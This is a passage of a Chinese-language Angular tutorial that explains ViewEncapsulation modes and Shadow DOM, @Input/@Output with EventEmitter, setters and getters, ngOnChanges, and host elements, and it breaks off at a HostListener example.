我们发现在 #shadow-root 中的元素，不受我们外界定义的 CSS shadowroot_son 类影响。因此我们可以利用 Shadow DOM 来封装我们自定义的 HTML 标签、CSS 样式和 JavaScript 代码。需要注意的是 Shadow DOM 兼容性还不是很好，具体请参考 - <a href="https://caniuse.com/#search=Shadow%20DOM" target="_blank" rel="noopener noreferrer">Can I Use Shadow DOM<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 。</p> <p>ViewEncapsulation 允许设置三个可选的值：</p> <ul><li>ViewEncapsulation.Emulated - 无 Shadow DOM，但是通过 Angular 提供的样式包装机制来封装组件，使得组件的样式不受外部影响。这是 Angular 的默认设置。</li> <li>ViewEncapsulation.Native - 使用原生的 Shadow DOM 特性</li> <li>ViewEncapsulation.None - 无 Shadow DOM，并且也无样式包装</li></ul> <p>ViewEncapsulation 枚举定义：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">enum</span> ViewEncapsulation <span class="token punctuation">{</span>
  Emulated<span class="token punctuation">,</span> <span class="token comment">// 默认值</span>
  Native<span class="token punctuation">,</span>
  None
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="viewencapsulation-none"><a href="#viewencapsulation-none" class="header-anchor">#</a> ViewEncapsulation.None</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewEncapsulation <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;p class=&quot;greet&quot;&gt;Hello {{name}}&lt;/p&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    .greet {
      background: #369;
      color: white;
    }
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  encapsulation<span class="token operator">:</span> ViewEncapsulation<span class="token punctuation">.</span>None <span class="token comment">// None | Emulated | Native</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>运行后的结果：
<img src="/vuebloger/img/post/2970826755-58c670fe44efa_fix732.png" alt=""></p> <p>ViewEncapsulation.None 设置的结果是没有 Shadow DOM，并且所有的样式都应用到整个 document，换句话说，组件的样式会受外界影响，可能被覆盖掉。</p> <h3 id="viewencapsulation-emulated"><a href="#viewencapsulation-emulated" class="header-anchor">#</a> ViewEncapsulation.Emulated</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewEncapsulation <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  <span class="token operator">...</span><span class="token punctuation">,</span>
  encapsulation<span class="token operator">:</span> ViewEncapsulation<span class="token punctuation">.</span>Emulated <span class="token comment">// None | Emulated | Native</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>运行后的结果：</p> <p><img src="/vuebloger/img/post/2488044164-58c67120ecf25_fix732.png" alt=""></p> <p>ViewEncapsulation.Emulated 设置的结果是没有 Shadow DOM，但是通过 Angular 提供的样式包装机制来封装组件，使得组件的样式不受外部影响。虽然样式仍然是应用到整个 document，但 Angular 为 .greet 类创建了一个 [_ngcontent-cmy-0] 选择器。可以看出，我们为组件定义的样式，被 Angular 修改了。其中的 _nghost-cmy- 和 _ngcontent-cmy- 用来实现局部的样式。</p> <h3 id="viewencapsulation-native"><a href="#viewencapsulation-native" class="header-anchor">#</a> ViewEncapsulation.Native</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ViewEncapsulation <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  <span class="token operator">...</span><span class="token punctuation">,</span>
  encapsulation<span class="token operator">:</span> ViewEncapsulation<span class="token punctuation">.</span>Native <span class="token comment">// None | Emulated | Native</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>运行后的结果：
<img src="/vuebloger/img/post/1713355679-58c67131e1c05_fix732.png" alt=""></p> <p>ViewEncapsulation.Native 设置的结果是使用原生的 Shadow DOM 特性。Angular 会把组件按照浏览器支持的 Shadow DOM 形式渲染，渲染结果如上图所示。</p> <h2 id="input-output"><a href="#input-output" class="header-anchor">#</a> Input/output</h2> <p>项目开发中尽量通过 @Input/@Output 装饰器定义无状态的组件，即组件仅依赖于输入属性，这样会大大提高组件可复用性</p> <h3 id="bindingpropertyname"><a href="#bindingpropertyname" class="header-anchor">#</a> bindingPropertyName</h3> <p>Input/Output 装饰器支持一个可选的参数，用来指定组件绑定属性的名称。如果没有指定，则默认使用 @Input/Output 装饰器装饰的属性名。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// counter.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> Output<span class="token punctuation">,</span> EventEmitter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    @<span class="token function">Output</span><span class="token punctuation">(</span><span class="token string">'countChange'</span><span class="token punctuation">)</span> change<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">...</span> <span class="token comment">// 其余代码未改变</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;p&gt;{{changeMsg}}&lt;/p&gt; 
   &lt;exe-counter [count]=&quot;initialCount&quot; 
    (countChange)=&quot;countChange($event)&quot;&gt;&lt;/exe-counter&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  initialCount<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  changeMsg<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">countChange</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>changeMsg <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">子组件change事件已触发，当前值是: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>event<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><h3 id="eventemitter"><a href="#eventemitter" class="header-anchor">#</a> EventEmitter</h3> <p>用来触发自定义事件，具体使用示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> numberEmitter<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
numberEmitter<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
numberEmitter<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="inputs-outputs"><a href="#inputs-outputs" class="header-anchor">#</a> inputs/outputs</h3> <p>inputs/outputs 定义在指令的 metadata 信息中，开发者对指令的输入属性一目了然。此外对于未选用 TypeScript 作为开发语言的开发者，也只能在 metadata 中定义指令的输入属性。</p> <p>@Input/@Output 属于属性装饰器，通过它我们可以一起定义属性的访问描述符 (public、private、protected)</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
    inputs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'count:value'</span><span class="token punctuation">]</span> <span class="token comment">// 类成员属性名称:绑定的输入属性名称</span>
    outputs<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'change:countChange'</span><span class="token punctuation">]</span>

<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token punctuation">{</span>
    count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   change<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>change<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">--</span><span class="token punctuation">;</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>change<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>不能同时使用 @Input/@Output 装饰器 或在 @Directive、@Component inputs 字段中定义同一个输入属性</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    inputs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'count:value'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    outputs<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'change:countChange'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">)</span> count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    @<span class="token function">Output</span><span class="token punctuation">(</span><span class="token string">'countChange'</span><span class="token punctuation">)</span> change<span class="token operator">:</span> EventEmitter<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">风格指南</p> <p>坚持使用 @Input 和 @Output ，而非 @Directive 和 @Component 装饰器的 inputs 和 outputs 属性：易于在类里面识别哪些属性是输入属性或输出属性。</p> <p>坚持把 @Input 或者 @Output 放到所装饰的属性的同一行：如果需要重命名与@Input或者@Output关联的属性或事件名，你可以在一个位置修改。</p> <p>避免为输入和输出属性指定别名,同一个属性有两个名字（一个对内一个对外）很容易导致混淆。</p></div> <h3 id="setter-getter"><a href="#setter-getter" class="header-anchor">#</a> setter/getter</h3> <p>setter 和 getter 是用来约束属性的设置和获取。通过 setter 和 getter 方式，我们对类中的私有属性进行了封装，能避免外界操作影响到该私有属性。此外通过 setter 我们还可以封装一些业务逻辑</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;当前值: {{ count }} &lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token punctuation">{</span>
    _count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 默认私有属性以下划线开头，不是必须也可以使用$count</span>
    biggerThanTen<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">set</span> <span class="token function">count</span> <span class="token punctuation">(</span><span class="token parameter">num<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>biggerThanTen <span class="token operator">=</span> num <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_count <span class="token operator">=</span> num<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">get</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> number <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_count<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h3 id="ngonchanges"><a href="#ngonchanges" class="header-anchor">#</a> ngOnChanges</h3> <p>当数据绑定输入属性的值发生变化的时候，Angular 将会主动调用 ngOnChanges 方法。它会获得一个 SimpleChanges 对象，包含绑定属性的新值和旧值，它主要用于监测组件输入属性的变化。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> SimpleChanges<span class="token punctuation">,</span> OnChanges <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span><span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token parameter">changes<span class="token operator">:</span> SimpleChanges</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>changes<span class="token punctuation">[</span><span class="token string">'count'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>需要注意的是，当手动改变输入属性的值，是不会触发 ngOnChanges 钩子的。以上代码运行后浏览器显示的结果：</p> <p><img src="/vuebloger/img/post/1263469588-58d10aa465a35_fix732.png" alt=""></p> <h3 id="双向数据绑定"><a href="#双向数据绑定" class="header-anchor">#</a> 双向数据绑定</h3> <img src="/vuebloger/img/post/20171125150925157.png"> <p>Angular 有4种数据绑定的方式。</p> <ul><li>插值表达式（interpolation）：插值表达式 在 <code>&lt;li&gt;</code>元素之间展示组件的 <code>hero.name</code> 属性值。</li> <li>属性绑定（property binding）：属性绑定 <code>[hero]</code> 将父组件 HeroListComponent 的 selectedHero 的值传递给向子组件 的 hero 属性。</li> <li>事件绑定（event binding）： 当用户点击一个 hero 的名字是，<code>(click)</code> 事件绑定调用了组件的 selectHero 方法。</li> <li>双向绑定是第四种重要的绑定方法。它使用 <code>[(ngModel)]</code> 指令，在一个表达式中同时绑定属性和事件。</li></ul> <h2 id="hostlistener-hostbinding"><a href="#hostlistener-hostbinding" class="header-anchor">#</a> HostListener/HostBinding</h2> <h3 id="host-element"><a href="#host-element" class="header-anchor">#</a> Host Element</h3> <p>宿主元素的概念同时适用于指令和组件。对于指令来说，这个概念是相当简单的。应用指令的元素，就是宿主元素。假设我们已声明了一个 HighlightDirective 指令 (selector: '[exeHighlight]')：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">exeHighlight</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>高亮的文本<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exe-counter</span> <span class="token attr-name">exeHighlight</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span>高亮的文本<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exe-counter</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>上面 html 代码中，p 元素就是宿主元素。如果该指令应用于自定义组件, exe-counter 自定义元素，就是宿主元素。</p> <h3 id="hostlistener"><a href="#hostlistener" class="header-anchor">#</a> HostListener</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// counting.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> HostListener <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'button[counting]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
